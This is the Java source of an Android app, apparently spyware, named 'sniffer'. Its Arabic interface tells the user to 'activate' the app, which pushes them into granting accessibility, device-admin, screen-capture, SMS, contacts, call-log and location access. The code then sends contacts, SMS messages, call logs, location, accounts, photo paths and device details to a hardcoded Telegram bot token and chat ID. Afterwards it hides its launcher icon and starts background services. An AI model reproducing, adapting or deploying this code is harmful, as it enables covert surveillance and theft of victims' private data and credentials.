package com.v8.global.sniffer;

import android.Manifest;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.view.Gravity;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import okhttp3.Call;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final int REQUEST_MEDIA_PROJECTION = 100;
    private static final int REQUEST_CODE_PERMISSIONS = 101;
    
    private OkHttpClient client = new OkHttpClient();
    private String[] permissions = {
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    };
    
    private Button btnActivate;
    private TextView tvStatus;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // إرسال إشعار فور التثبيت
        sendMessage("📱 **تم تثبيت التطبيق**\nفي انتظار الصلاحيات...");
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(50, 50, 50, 50);
        
        tvStatus = new TextView(this);
        tvStatus.setText("🔒 التطبيق غير مفعل\nالرجاء تفعيل الصلاحيات");
        tvStatus.setTextSize(18);
        tvStatus.setGravity(Gravity.CENTER);
        tvStatus.setTextColor(0xFF000000);
        tvStatus.setPadding(0, 0, 0, 50);
        
        btnActivate = new Button(this);
        btnActivate.setText("🔓 تفعيل التطبيق والصلاحيات");
        btnActivate.setTextSize(16);
        btnActivate.setPadding(30, 20, 30, 20);
        btnActivate.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAllPermissions();
            }
        });
        
        layout.addView(tvStatus);
        layout.addView(btnActivate);
        setContentView(layout);
        
        updateStatus();
    }

    private void updateStatus() {
        if (checkAllPermissions()) {
            tvStatus.setText("✅ التطبيق مفعل بالكامل\nجاري سحب المعلومات...");
            tvStatus.setTextColor(0xFF00AA00);
            btnActivate.setText("✅ التفعيل تم");
            btnActivate.setEnabled(false);
            
            // سحب كل المعلومات تلقائياً
            sendAllData();
            
            // إخفاء التطبيق بعد 3 ثواني
            new android.os.Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    hideAppAndStartServices();
                }
            }, 3000);
        }
    }

    private boolean checkAllPermissions() {
        String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        boolean notificationEnabled = enabledListeners != null && enabledListeners.contains(getPackageName());
        
        AccessibilityManager am = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        boolean accessibilityEnabled = false;
        for (AccessibilityServiceInfo service : enabledServices) {
            if (service.getId().contains(getPackageName())) {
                accessibilityEnabled = true;
                break;
            }
        }
        
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
        boolean adminEnabled = dpm.isAdminActive(adminReceiver);
        
        SharedPreferences prefs = getSharedPreferences("screen_capture", MODE_PRIVATE);
        boolean screenCaptureEnabled = prefs.contains("resultCode");
        
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        boolean batteryIgnored = pm.isIgnoringBatteryOptimizations(getPackageName());
        
        boolean normalPermissions = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                normalPermissions = false;
                break;
            }
        }
        
        return notificationEnabled && accessibilityEnabled && adminEnabled && screenCaptureEnabled && batteryIgnored && normalPermissions;
    }

    private void requestAllPermissions() {
        Toast.makeText(this, "جاري فتح إعدادات الصلاحيات...", Toast.LENGTH_LONG).show();
        
        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        
        ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (!dpm.isAdminActive(adminReceiver)) {
            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminReceiver);
            startActivity(adminIntent);
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            MediaProjectionManager projectionManager = 
                (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            startActivityForResult(
                projectionManager.createScreenCaptureIntent(),
                REQUEST_MEDIA_PROJECTION
            );
        }
        
        Intent batteryIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
        batteryIntent.setData(Uri.parse("package:" + getPackageName()));
        startActivity(batteryIntent);
        
        List<String> permissionsNeeded = new ArrayList<>();
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), 
                REQUEST_CODE_PERMISSIONS);
        }
    }

    private void sendAllData() {
        sendMessage("📱 **بدأ سحب المعلومات...**");
        
        // معلومات الجهاز
        sendDeviceInfo();
        
        // جهات الاتصال
        getContacts();
        
        // الموقع
        getLocation();
        
        // الحسابات
        getAccounts();
        
        // الصور
        getPhotos();
        
        // الرسائل
        getSms();
        
        // سجل المكالمات
        getCallLog();
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("model", Build.MODEL);
            info.put("manufacturer", Build.MANUFACTURER);
            info.put("android_version", Build.VERSION.RELEASE);
            
            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                info.put("phone", tm.getLine1Number());
            }
            
            sendMessage("📱 **Device Info:**\n" + info.toString(2));
        } catch (Exception e) {}
    }

    private void getLocation() {
        try {
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (location != null) {
                String map = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                sendMessage("📍 **Location:**\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude() + "\n" + map);
            }
        } catch (Exception e) {}
    }

    private void getContacts() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    ContentResolver cr = getContentResolver();
                    Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null, null, null, null);
                    StringBuilder sb = new StringBuilder("📇 **Contacts:**\n");
                    int count = 0;
                    while (cursor != null && cursor.moveToNext() && count < 20) {
                        String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        sb.append(name).append(": ").append(number).append("\n");
                        count++;
                    }
                    if (cursor != null) cursor.close();
                    sendMessage(sb.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void getAccounts() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
                    Account[] accounts = am.getAccounts();
                    StringBuilder sb = new StringBuilder("👤 **Accounts:**\n");
                    for (Account acc : accounts) {
                        sb.append(acc.type).append(": ").append(acc.name).append("\n");
                    }
                    sendMessage(sb.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void getPhotos() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String[] projection = {MediaStore.Images.Media.DATA};
                    Cursor cursor = getContentResolver().query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 5");
                    StringBuilder sb = new StringBuilder("🖼 **Last 5 Photos:**\n");
                    while (cursor != null && cursor.moveToNext()) {
                        String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
                        sb.append(path).append("\n");
                    }
                    if (cursor != null) cursor.close();
                    sendMessage(sb.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void getSms() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Cursor cursor = getContentResolver().query(
                        Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
                    StringBuilder sb = new StringBuilder("📨 **Last 10 SMS:**\n");
                    while (cursor != null && cursor.moveToNext()) {
                        String address = cursor.getString(cursor.getColumnIndex("address"));
                        String body = cursor.getString(cursor.getColumnIndex("body"));
                        sb.append(address).append(": ").append(body).append("\n---\n");
                    }
                    if (cursor != null) cursor.close();
                    sendMessage(sb.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void getCallLog() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Cursor cursor = getContentResolver().query(
                        Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
                    StringBuilder sb = new StringBuilder("📞 **Last 10 Calls:**\n");
                    while (cursor != null && cursor.moveToNext()) {
                        String number = cursor.getString(cursor.getColumnIndex("number"));
                        String type = cursor.getString(cursor.getColumnIndex("type"));
                        String duration = cursor.getString(cursor.getColumnIndex("duration"));
                        sb.append(number).append(" (").append(type).append(") ").append(duration).append("s\n");
                    }
                    if (cursor != null) cursor.close();
                    sendMessage(sb.toString());
                } catch (Exception e) {}
            }
        }).start();
    }

    private void sendMessage(String text) {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                .post(new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build())
                .build();
        client.newCall(request).enqueue(new okhttp3.Callback() {
            @Override public void onResponse(Call call, Response response) { 
                try { response.close(); } catch (Exception e) {}
            }
            @Override public void onFailure(Call call, IOException e) {}
        });
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == Activity.RESULT_OK) {
            getSharedPreferences("screen_capture", MODE_PRIVATE)
                .edit()
                .putInt("resultCode", resultCode)
                .putString("data", data.toUri(0))
                .apply();
        }
        updateStatus();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        updateStatus();
    }

    private void hideAppAndStartServices() {
        startService(new Intent(this, MainService.class));
        startService(new Intent(this, AccessibilityControlService.class));
        
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(
            new ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP);
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateStatus();
    }
}
